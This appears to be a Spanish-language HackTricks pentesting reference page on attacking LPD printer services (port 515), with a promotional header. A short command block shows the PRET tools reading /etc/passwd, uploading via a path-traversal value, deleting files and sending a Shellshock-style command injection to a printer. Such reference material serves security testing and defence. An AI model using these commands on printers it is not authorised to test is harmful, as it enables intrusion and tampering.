<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Equipos Rojos de AWS de HackTricks)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

### **Introducci贸n al Protocolo LPD**

En la d茅cada de 1980, se desarroll贸 el **protocolo Line Printer Daemon (LPD)** en Berkeley Unix, que posteriormente se formaliz贸 a trav茅s de RFC1179. Este protocolo opera sobre el puerto 515/tcp, permitiendo interacciones a trav茅s del comando `lpr`. La esencia de la impresi贸n a trav茅s de LPD implica enviar un **archivo de control** (para especificar detalles del trabajo y del usuario) junto con un **archivo de datos** (que contiene la informaci贸n de impresi贸n). Mientras que el archivo de control permite la selecci贸n de **varios formatos de archivo** para el archivo de datos, el manejo de estos archivos est谩 determinado por la implementaci贸n espec铆fica de LPD. Una implementaci贸n ampliamente reconocida para sistemas tipo Unix es **LPRng**. Es importante destacar que el protocolo LPD puede ser explotado para ejecutar trabajos de impresi贸n maliciosos de **PostScript** o **PJL**.

### **Herramientas para Interactuar con Impresoras LPD**

[**PRET**](https://github.com/RUB-NDS/PRET) presenta dos herramientas esenciales, `lpdprint` y `lpdtest`, que ofrecen un m茅todo sencillo para interactuar con impresoras compatibles con LPD. Estas herramientas permiten una variedad de acciones, desde imprimir datos hasta manipular archivos en la impresora, como descargar, subir o eliminar:
```python
# To print a file to an LPD printer
lpdprint.py hostname filename
# To get a file from the printer
lpdtest.py hostname get /etc/passwd
# To upload a file to the printer
lpdtest.py hostname put ../../etc/passwd
# To remove a file from the printer
lpdtest.py hostname rm /some/file/on/printer
# To execute a command injection on the printer
lpdtest.py hostname in '() {:;}; ping -c1 1.2.3.4'
# To send a mail through the printer
lpdtest.py hostname mail lpdtest@mailhost.local
```
Para aquellas personas interesadas en explorar m谩s a fondo el mundo del **hackeo de impresoras**, se puede encontrar un recurso completo aqu铆: [**Hackeando Impresoras**](http://hacking-printers.net/wiki/index.php/Main_Page).

# Shodan

* `puerto 515`
